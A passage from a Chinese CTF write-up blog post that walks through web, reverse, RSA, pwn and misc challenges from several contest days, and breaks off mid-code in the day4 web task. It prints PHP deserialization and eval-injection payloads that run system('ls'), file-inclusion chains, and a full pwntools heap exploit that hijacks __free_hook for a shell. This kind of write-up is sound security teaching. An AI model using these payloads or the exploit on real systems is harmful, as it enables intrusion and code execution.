<!DOCTYPE html>
<html>
  <head><meta name="generator" content="Hexo 3.9.0">
      <script>
  var _hmt = _hmt || []
  ;(function() {
    var hm = document.createElement('script')
    hm.src = 'https://hm.baidu.com/hm.js?5a0acc897fd96474a2c8f4deac84611a'
    var s = document.getElementsByTagName('script')[0]
    s.parentNode.insertBefore(hm, s)
  })()
</script> 
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content>
    <meta name="description" content>
    
    <title>
      第四季CTF答题赛write up - pumpkin9
    </title>
    <link rel="manifest" href="/manifest.json">
    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="/style/style.css">
  </head>
  <body>
    
    <div id="post-toc" class="animated hiddenToc hide">
      <span class="title">Toc</span>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#day1"><span class="toc-text">day1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-text">web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-text">misc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-text">Reverse</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#day2"><span class="toc-text">day2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-1"><span class="toc-text">web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rsa"><span class="toc-text">rsa</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#day3"><span class="toc-text">day3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web1"><span class="toc-text">Web1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web2"><span class="toc-text">web2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-1"><span class="toc-text">misc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#day4"><span class="toc-text">day4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#apk123"><span class="toc-text">apk123</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Internal-Chat-System"><span class="toc-text">Internal Chat System</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#day5"><span class="toc-text">day5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse"><span class="toc-text">reverse</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-2"><span class="toc-text">web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn-1"><span class="toc-text">pwn</span></a></li></ol></li></ol>
    </div>
    
    <div id="fixed-menu-wrap">
      <span class="iconfont icon-sousuo search-box menu-reset"></span>
      <span class="icon-toc menu-reset">Toc</span>
      <span class="iconfont icon-arrowup menu-reset"></span>
    </div>
    <div id="fixed-menu">
      <span class="iconfont icon-menu-"></span>
    </div>
    <div id="progress">
      <div class="line"></div>
    </div>
    <div id="search-shade" class="animated hiddenSearch hide">
      <div class="input-wrap">
        <span class="iconfont icon-sousuo search-box"></span>
        <input type="text" placeholder="Search">
        <span class="iconfont icon-close"></span>
      </div>
      <div class="search-result">
        <div class="meta">
          <span><b id="result-count">0</b> results found</span>
          <img src="/images/logo.jpeg">
        </div>
        <ul id="result-box"></ul>
      </div>
    </div>
    <div id="menu-mask" class="animated hideMenuMask hide">
      <span class="iconfont icon-close"></span>
      <div class="nav">
        
        <a href="/" class>
          Home
        </a>
        
        <a href="/archives" class>
          Archives
        </a>
        
        <a href="/categories" class>
          Categories
        </a>
        
        <a href="/tags" class>
          Tags
        </a>
        
        <a href="/friends" class>
          Friends
        </a>
        
        <a href="/about" class>
          About
        </a>
        
      </div>
    </div>
    <div id="header">
      <div class="intro">
        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
        <div class="author">pumpkin9</div>
      </div>
      <div class="nav">
        <span class="iconfont icon-menu menu-icon"></span>
        <a href="#" class="search-box">
          <span class="iconfont icon-sousuo"></span>
        </a>
      </div>
    </div>
    <div id="side" class="animated bounceInLeft">
      <div class="shrink">
        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
        <span class="iconfont icon-menu toggle-icon"></span>
        <a href="#" class="search-box">
          <span class="iconfont icon-sousuo"></span>
        </a>
      </div>
      <div class="magnify">
        <div class="about">
          <div class="author">pumpkin9</div>
          <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
        </div>

        <div class="nav">
          
          <a href="/" class>
            Home
          </a>
          
          <a href="/archives" class>
            Archives
          </a>
          
          <a href="/categories" class>
            Categories
          </a>
          
          <a href="/tags" class>
            Tags
          </a>
          
          <a href="/friends" class>
            Friends
          </a>
          
          <a href="/about" class>
            About
          </a>
          
          <a href="#" class="search-box">
            <span class="iconfont icon-sousuo"></span>
          </a>
        </div>
        <div class="bottom">
          <div class="follow">
             
            <a href="/atom.xml" target="_block">
              <span class="iconfont icon-rss"></span>
            </a>
            
          </div>
        </div>
      </div>
    </div>
    <div id="container">
      <div class="main animated bounceInRight delay-0.7s">
        <article class="post-entry">
    <div class="header">
      
      <div class="title">第四季CTF答题赛write up</div>
      <div class="meta">
        <span class="item">
          <span class="iconfont icon-time-circle"></span>
          <span>2019/12/24</span>
        </span>

        
          <span class="item leancloud-visitors" id="/2019/12/24/第四季CTF答题赛write-up/" data-flag-title="第四季CTF答题赛write up">
            <span class="iconfont icon-eye1"></span>
            <span class="leancloud-visitors-count"></span>
          </span>
        

         
        <span class="item">
          <span class="iconfont icon-folder"></span>
          <span>
              
                
                  <a href="/categories/CTF">CTF</a>
                
              
          </span>
        </span>
        
        
         
          <span class="item">
            <span class="iconfont icon-tag1"></span>
            <span>
                
                  
                    <a href="/tags/write up">write up</a>
                  
                
            </span>
          </span>
         
      </div>
      <div>
      </div>
    </div>
    <p>[toc]</p>
<h1 id="day1">day1<a class="post-anchor" href="#day1"></a></h1><h2 id="web">web<a class="post-anchor" href="#web"></a></h2><p>存在文件包含，php伪协议读到user.php 的源码</p>
<p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1ga7miplyb2j31js0r6aeq.jpg" data-caption data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga7miplyb2j31js0r6aeq.jpg" alt></a></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">convent</span></span>&#123;
	<span class="hljs-keyword">var</span> $warn = <span class="hljs-string">"No hacker."</span>;
	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span>&#123;
		<span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;warn);
	&#125;
	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>&#123;
		<span class="hljs-keyword">foreach</span>(get_object_vars(<span class="hljs-keyword">$this</span>) <span class="hljs-keyword">as</span> $k =&gt; $v) &#123;
			<span class="hljs-keyword">$this</span>-&gt;$k = <span class="hljs-keyword">null</span>;
		&#125;
	&#125;
&#125;
$cmd = $_POST[cmd];
unserialize($cmd);
<span class="hljs-meta">?&gt;</span></code></pre>

<p>运行</p>
<pre><code class="hljs php">$exp = <span class="hljs-keyword">new</span> convent();
$exp -&gt; warn = <span class="hljs-string">"system('ls');"</span>;
$flag = serialize($exp);
print_r($flag)</code></pre>

<p><code>O:7:&quot;convent&quot;:1:{s:4:&quot;warn&quot;;s:13:&quot;system(&#39;ls&#39;);&quot;;}</code></p>
<p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1ga7n4lfok8j31je0rkn0v.jpg" data-caption data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga7n4lfok8j31je0rkn0v.jpg" alt></a></p>
<p>flag{qishinizhixuyaocaidaozhegewenjiandemingzijiuxingle}</p>
<h2 id="misc">misc<a class="post-anchor" href="#misc"></a></h2><p>steglove</p>
<p>lsb 隐写</p>
<p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1gaa9axui6tj315w0u016i.jpg" data-caption="image-20191226173326911" data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaa9axui6tj315w0u016i.jpg" alt="image-20191226173326911"></a></p>
<p>flag{test123}</p>
<h2 id="Reverse">Reverse<a class="post-anchor" href="#Reverse"></a></h2><p>一个魔改base 加 异或</p>
<pre><code class="hljs python">key = <span class="hljs-string">""</span>
data = [<span class="hljs-number">0x59</span>,<span class="hljs-number">0x6E</span>,<span class="hljs-number">0x7B</span>,<span class="hljs-number">0x6B</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x5A</span>,<span class="hljs-number">0x5B</span>,<span class="hljs-number">0x4D</span>,<span class="hljs-number">0x6F</span>,<span class="hljs-number">0x5B</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x5A</span>,<span class="hljs-number">0x2A</span>,<span class="hljs-number">0x5A</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x6E</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x5B</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x5B</span>,<span class="hljs-number">0x2A</span>,<span class="hljs-number">0x29</span>,<span class="hljs-number">0x3</span>]
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(data)):
	key+=chr(data[i]^<span class="hljs-number">3</span>)
<span class="hljs-keyword">print</span> key
<span class="hljs-comment">#coding=utf8</span>
<span class="hljs-keyword">import</span> string
<span class="hljs-keyword">import</span> base64
STANDARD_ALPHABET = <span class="hljs-string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>
CUSTOM_ALPHABET = <span class="hljs-string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz)!@#$%^*(+/="</span>
ENCODE_TRANS = string.maketrans(STANDARD_ALPHABET,CUSTOM_ALPHABET)
DECODE_TRANS = string.maketrans(CUSTOM_ALPHABET,STANDARD_ALPHABET)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span><span class="hljs-params">(input)</span>:</span>
  <span class="hljs-keyword">return</span> base64.b64decode(input.translate(DECODE_TRANS))
flag = decode(key)
<span class="hljs-keyword">print</span> flag</code></pre>

<p>flag{base_f4ck_Reverse}</p>
<h1 id="day2">day2<a class="post-anchor" href="#day2"></a></h1><h2 id="web-1">web<a class="post-anchor" href="#web-1"></a></h2><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
    show_source(<span class="hljs-keyword">__FILE__</span>);
    <span class="hljs-keyword">include</span> <span class="hljs-string">"flag.php"</span>;
    $a = @$_REQUEST[<span class="hljs-string">'hello'</span>];
    $seed = @$_REQUEST[<span class="hljs-string">'seed'</span>];
    $key = @$_REQUEST[<span class="hljs-string">'key'</span>];

    mt_srand($seed);
    $true_key = mt_rand();
    <span class="hljs-keyword">if</span> ($key == $true_key)&#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Key Confirm"</span>;
    &#125;
    <span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"Key Error"</span>);
    &#125;
    <span class="hljs-keyword">eval</span>( <span class="hljs-string">"var_dump($a);"</span>);
<span class="hljs-meta">?&gt;</span></code></pre>

<p>预测随机数</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    show_source(<span class="hljs-keyword">__FILE__</span>);
    $seed = <span class="hljs-number">123456</span>;
    $key = @$_REQUEST[<span class="hljs-string">'key'</span>];

    mt_srand($seed);
    $true_key = mt_rand();
    <span class="hljs-keyword">echo</span> $true_key;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>最后闭合var_dump 拿到flag</p>
<p><code>payload = http://120.55.43.255:27189/?seed=123456&amp;key=1863022934&amp;hello=1);system(&#39;ls&#39;</code></p>
<p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1gaa937iqahj316t0u0qjn.jpg" data-caption="image-20191226172557097" data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaa937iqahj316t0u0qjn.jpg" alt="image-20191226172557097"></a></p>
<p>flag{Y0u_Solv3_s4mpl3…oNc3_Mor3}</p>
<h2 id="rsa">rsa<a class="post-anchor" href="#rsa"></a></h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2
<span class="hljs-keyword">import</span> libnum
e=<span class="hljs-number">65537</span>
n=<span class="hljs-number">444511907374811621333864968430251419855347882081695888904531795366857517417289716213363408137550866409163408633679685635315881237914815762134949770798439327373469286675370381115822381092997433491238495970527484356127131132345893007368069814286822931047915482947544230741924674880304607902413527794657556174021361113759962742306966643629644800759209829893438222447478882663573891473386520138017997195362559918730232709719486847337248425121547893862458228964360472119045154255446606447184782930767120924229261090464514045697735201016333117579385787597262783543886217220299959364476125167328883418109849139384318692440116746717156025869399990008034002881758452936213924306428955442475834311604905905260723607788504332389824348292286402781474054375184928462870240017012586229806658850881803134678565293180207556731290044948846308165695896369703720482941116135445836684836990286418102640883844706122407701782360072256987197118468391662366105964629786899281484884877640733549203394680006068637251717623691598753570260479050407069262236583726905151495550801274277155039839844872050380772537409714164680083539118124646217833871816488578092001365486400242215564766336041803413006183310354910820598373905617564797817421231716827155927723376783</span>
dp=<span class="hljs-number">20688083194401098183398626094352469308150523583583104270723199988926694776131531953207031668652408481119466919329893607763657623952024909876740067584191851505244658377465365020503008072292716279306615911408934182303357474341329766407852983275790499225322862499664901633190925232802162977135254216707834894816730529759991634343322039528413883937752397011466779521590767711786777317159161700645318091278528395252576086979838790917201179739657819356771788743301669430631157222234922010934163688512789947321007479617996170289230676037655762865962020063056831019134814970048718940037920888121806608032574204482673114726401</span>
c=<span class="hljs-number">378245912689862819668716257795108255336928883693984263805908702337591160408234974716356292413190786704878880742998101926728409825216339197208512929079484687018187263522243781958701468849915372674337274640196043362477406890622345686503512151501592397926764442945655423801602100185867239106836704835215686246083812117439685990637352246191517010645343417283169123105697782747026231044064639955374854873089604766677942725374108213749982052985866259433900255218180285975477045323647923881322428349632056484406017564586481848442834247385904402824072352354677823823078646874632195128328299942128116508251564811923564362991466660005438580449558184197006623490303413636461137434703925564785299335803341222051570131842042120923719184091689629809380828306649702440460761848154682611972768099340896995546188526274235118488618951865589050087434162728116205149188555273127955536588551565951618535230908129965250151258048934985977493740897420718340268536363763127676899114219828753570040978640121185354431884041597851910784347040946251752577201426797684912671641470307249794269755972278013107831885544781029384256069586713714201822683071958299038410102821213570933652719191413490563464823296852894960994148922867149263897530215474500564443133161527</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">65538</span>):
    <span class="hljs-keyword">if</span> (dp*e<span class="hljs-number">-1</span>)%i == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">if</span> n%(((dp*e<span class="hljs-number">-1</span>)/i)+<span class="hljs-number">1</span>)==<span class="hljs-number">0</span>:
            p=((dp*e<span class="hljs-number">-1</span>)/i)+<span class="hljs-number">1</span>
            q=n/(((dp*e<span class="hljs-number">-1</span>)/i)+<span class="hljs-number">1</span>)
            phi = (p<span class="hljs-number">-1</span>)*(q<span class="hljs-number">-1</span>)
            d = gmpy2.invert(e,phi)%phi
            <span class="hljs-keyword">print</span> libnum.n2s(pow(c,d,n))</code></pre>

<p>flag{R_s_a_1s_Funny!!}</p>
<h2 id="pwn">pwn<a class="post-anchor" href="#pwn"></a></h2><p>本来找到一个相似的<a href="https://x3h1n.github.io/2019/10/04/KCTF-Q3-PWN/" target="_blank" rel="noopener">题目</a>，利用 IO_FILE</p>
<p>但是这个题目只限制修改 __molloc_hook 并没有限制free_hook</p>
<ol>
<li>leak libc</li>
<li>写size进main_arena</li>
<li>申请到main_arena的chunk</li>
<li>改写<strong>top_chunk到</strong>free_hook附近</li>
<li>add多次，从而让<strong>top_chunk指向</strong>free_hook</li>
<li>申请到一个chunk，chunk地址是__free_hook（或附近）</li>
<li>改写__free_hook</li>
<li>getshell</li>
</ol>
<p>注意：在[ ``__free_hook-0x50<code>,</code> __free_hook`]这个区间内（大概），是不能改写的（或者说只能写入\x00），如果改写了的话可能会导致程序的缓冲区被破坏</p>
<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span>
<span class="hljs-comment">#encoding:utf-8</span>
<span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> sys
context.arch = <span class="hljs-string">'amd64'</span>
<span class="hljs-comment"># context.log_level='debug'</span>
context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]
file_name = <span class="hljs-string">'./heap'</span>
libc_name = <span class="hljs-string">'../libc/18-libc64.so'</span>
ip = <span class="hljs-string">'120.55.43.255'</span>
port = <span class="hljs-string">'12240'</span>
debug = <span class="hljs-number">1</span>
<span class="hljs-keyword">if</span> debug:
	p = process(file_name)
	elf = ELF(file_name)
	libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)
<span class="hljs-keyword">else</span>:
	p = remote(ip,int(port))
	elf = ELF(file_name)
	libc = ELF(<span class="hljs-string">"../libc/18-libc64.so"</span>)
li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)
ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>
	p.sendlineafter(<span class="hljs-string">" :"</span>,<span class="hljs-string">"1"</span>)
	p.sendlineafter(<span class="hljs-string">": "</span>,str(size))
	p.sendafter(<span class="hljs-string">": "</span>,content)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
	p.sendlineafter(<span class="hljs-string">" :"</span>,<span class="hljs-string">"2"</span>)
	p.sendlineafter(<span class="hljs-string">": "</span>,str(idx))

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>
	p.sendlineafter(<span class="hljs-string">" :"</span>,<span class="hljs-string">"3"</span>)

<span class="hljs-comment"># leak libc</span>
add(<span class="hljs-number">0x88</span>,<span class="hljs-string">"\x11"</span>) <span class="hljs-comment">#0</span>
add(<span class="hljs-number">0x18</span>,<span class="hljs-string">"\x22"</span>) <span class="hljs-comment">#1</span>
free(<span class="hljs-number">0</span>)
add(<span class="hljs-number">0x88</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">8</span>) <span class="hljs-comment">#0</span>
show()
p.recvuntil(<span class="hljs-string">"0 : aaaaaaaa"</span>)
libc.address = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span class="hljs-number">-3951480</span>
ls(<span class="hljs-string">"libc addr"</span>,libc.address)
one_gg = <span class="hljs-number">0x4526a</span> + libc.address

add(<span class="hljs-number">0x48</span>,<span class="hljs-string">"\x33"</span>) <span class="hljs-comment">#2</span>
add(<span class="hljs-number">0x48</span>,<span class="hljs-string">"\x33"</span>) <span class="hljs-comment">#3</span>
add(<span class="hljs-number">0x18</span>,<span class="hljs-string">"\x55"</span>) <span class="hljs-comment">#4</span>
add(<span class="hljs-number">0x68</span>,<span class="hljs-string">"\x44"</span>) <span class="hljs-comment">#5</span>
add(<span class="hljs-number">0x68</span>,<span class="hljs-string">"\x44"</span>) <span class="hljs-comment">#6</span>
add(<span class="hljs-number">0x18</span>,<span class="hljs-string">"/bin/sh\x00"</span>) <span class="hljs-comment">#7</span>
free(<span class="hljs-number">4</span>)
free(<span class="hljs-number">1</span>)
add(<span class="hljs-number">0x18</span>,<span class="hljs-string">"\x22"</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">"\xa1"</span>) <span class="hljs-comment">#1</span>
free(<span class="hljs-number">2</span>)
free(<span class="hljs-number">3</span>)
target = <span class="hljs-number">0x3c4b4d</span> + libc.address
add(<span class="hljs-number">0x98</span>,<span class="hljs-string">"2"</span>*<span class="hljs-number">0x48</span>+p64(<span class="hljs-number">0x51</span>)+p64(target)) <span class="hljs-comment">#2</span>
add(<span class="hljs-number">0x48</span>,<span class="hljs-string">"1"</span>) <span class="hljs-comment">#3</span>
add(<span class="hljs-number">0x18</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">"\xe1"</span>)
free(<span class="hljs-number">5</span>)
free(<span class="hljs-number">6</span>)
target2 = <span class="hljs-number">0x3c4b3d</span> + libc.address
add(<span class="hljs-number">0xd8</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">0x68</span>+p64(<span class="hljs-number">0x71</span>)+p64(target2)) <span class="hljs-comment">#4</span>
add(<span class="hljs-number">0x68</span>,<span class="hljs-string">"\n"</span>) <span class="hljs-comment">#5</span>
add(<span class="hljs-number">0x68</span>,<span class="hljs-string">"1"</span>*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p64(libc.symbols[<span class="hljs-string">'__free_hook'</span>]<span class="hljs-number">-0xb58</span>)) <span class="hljs-comment">#6</span>
li(<span class="hljs-string">"free hook"</span>,libc.symbols[<span class="hljs-string">'__free_hook'</span>])
add(<span class="hljs-number">0x208</span>,<span class="hljs-string">"1"</span>*<span class="hljs-number">0x200</span>) <span class="hljs-comment">#7</span>
add(<span class="hljs-number">0x208</span>,<span class="hljs-string">"2"</span>*<span class="hljs-number">0x200</span>) <span class="hljs-comment">#8</span>
add(<span class="hljs-number">0x208</span>,<span class="hljs-string">"3"</span>*<span class="hljs-number">0x200</span>) <span class="hljs-comment">#9</span>
add(<span class="hljs-number">0x208</span>,<span class="hljs-string">"4"</span>*<span class="hljs-number">0x200</span>) <span class="hljs-comment">#10</span>
add(<span class="hljs-number">0x208</span>,<span class="hljs-string">"5"</span>*<span class="hljs-number">0x200</span>) <span class="hljs-comment">#11</span>
add(<span class="hljs-number">0x100</span><span class="hljs-number">-0x20</span>,<span class="hljs-string">"\n"</span>)
add(<span class="hljs-number">0x100</span>,p64(<span class="hljs-number">1</span>)+p64(one_gg))
free(<span class="hljs-number">0</span>)
<span class="hljs-comment"># gdb.attach(p)</span>
p.interactive()</code></pre>

<p>flag{8c8q7t4h-jllm-izsh-9mku-d691r57eu0ly}</p>
<h1 id="day3">day3<a class="post-anchor" href="#day3"></a></h1><h2 id="Web1">Web1<a class="post-anchor" href="#Web1"></a></h2><p>题目给出源码</p>
<pre><code class="hljs php">$user = $_GET[<span class="hljs-string">"user"</span>];
$file = $_GET[<span class="hljs-string">"file"</span>];
$pass = $_GET[<span class="hljs-string">"pass"</span>];

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="hljs-string">'r'</span>)===<span class="hljs-string">"admin"</span>))&#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"hello admin!&lt;br&gt;"</span>;
    <span class="hljs-keyword">include</span>($file); <span class="hljs-comment">//class.php</span>
&#125;<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"you are not admin ! "</span>;
&#125;</code></pre>

<p>这个题目首先要突破的是：<br><code>if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;the user is admin&quot;))</code><br>让file_get_contents($user,’r’)===”admin”<br>用php的封装协议php://input，因为php://input可以得到原始的post数据：</p>
<a href="https://tva1.sinaimg.cn/large/006tNbRwly1gaa9gsy737j31870u0dl4.jpg" data-caption="image-20191226173903523" data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaa9gsy737j31870u0dl4.jpg" alt="image-20191226173903523"></a>

<p>file=php://filter/convert.base64-encode/resource=class.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(E_ALL &amp; ~E_NOTICE);

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Read</span></span>&#123;<span class="hljs-comment">//fffffflag.php</span>
    <span class="hljs-keyword">public</span> $file;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span></span>&#123;
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file))&#123;
            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);    
        &#125;
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Awwwwwwwwwww man"</span>;
    &#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>看到fffffflag.php，猜测flag或许就从这段代码中找出。发现了比较关键的一个函数<code>__tostring()</code>,此函数的作用是将Flag类作为字符串执行时会自动执行此函数，并且将变量$file作为文件名输出文件内容。但是，这个时候发现并没有代码显示可以调用这个类，如果没有调用这个类，也就无法执行__tostring()函数。而且，还有一个pass参数没有用上，所以考虑，或许还会存在另一段代码。</p>
<p>读一下index.php的源码</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(E_ALL &amp; ~E_NOTICE);
$user = $_GET[<span class="hljs-string">"user"</span>];
$file = $_GET[<span class="hljs-string">"file"</span>];
$pass = $_GET[<span class="hljs-string">"pass"</span>];

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="hljs-string">'r'</span>)===<span class="hljs-string">"admin"</span>))&#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"hello admin!&lt;br&gt;"</span>;
    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/fffffflag/"</span>,$file))&#123;
        <span class="hljs-keyword">exit</span>();
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">include</span>($file); <span class="hljs-comment">//class.php</span>
        $pass = unserialize($pass);
        <span class="hljs-keyword">echo</span> $pass;
    &#125;
&#125;<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"you are not admin ! "</span>;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br/&gt;"</span>;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"hava a rest and then change your choose."</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>

<p>发现了正则匹配函数<code>preg_match(&quot;/fffffflag/&quot;,$file))</code> ，对flag进行了正则匹配。</p>
<p><code>payload = http://120.55.43.255:28119/?user=php://input&amp;file=class.php&amp;pass=O:4:&quot;Read&quot;:1:{s:4:&quot;file&quot;;s:13:&quot;fffffflag.php&quot;;}</code> + post “admin”</p>
<p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1gaa9tq9sgsj31960u0jxu.jpg" data-caption="image-20191226175128138" data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaa9tq9sgsj31960u0jxu.jpg" alt="image-20191226175128138"></a></p>
<p>flag{woyebuzhidaoyaononggeshaflagheshia}</p>
<h2 id="web2">web2<a class="post-anchor" href="#web2"></a></h2><p>fuzz 了一下 发现cut没有过滤</p>
<p><a href="https://tva1.sinaimg.cn/large/006tNbRwly1gaa9zmvnqkj30tk06w0v2.jpg" data-caption="image-20191226175711730" data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaa9zmvnqkj30tk06w0v2.jpg" alt="image-20191226175711730"></a></p>
<a href="https://tva1.sinaimg.cn/large/006tNbRwly1gaa06pp6e1j316g0lc45b.jpg" data-caption="image-20191226121756570" data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaa06pp6e1j316g0lc45b.jpg" alt="image-20191226121756570"></a>

<p>flag{WOw_Cut_4Nd_C4t_lo0kS_Sh49e}</p>
<h2 id="misc-1">misc<a class="post-anchor" href="#misc-1"></a></h2><p>pip install anhengtimuflag</p>
<p>flag{a70483c2fa93f9bd54c4fcf3cca0b484}</p>
<h1 id="day4">day4<a class="post-anchor" href="#day4"></a></h1><h2 id="Web">Web<a class="post-anchor" href="#Web"></a></h2><pre><code class="hljs php">There is a ping.php
&lt;!--
    $password=<span class="hljs-string">"****************"</span>;
     <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'password'</span>]))&#123;
        <span class="hljs-keyword">if</span> (strcmp($_POST[<span class="hljs-string">'password'</span>], $password) == <span class="hljs-number">0</span>) &#123;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Right!!!login success"</span>;
            <span class="hljs-keyword">include</span>($_REQUEST[<span class="hljs-string">'path'</span>]);
            <span class="hljs-keyword">exit</span>();
        &#125; <span class="hljs-keyword">else</span> &#123;
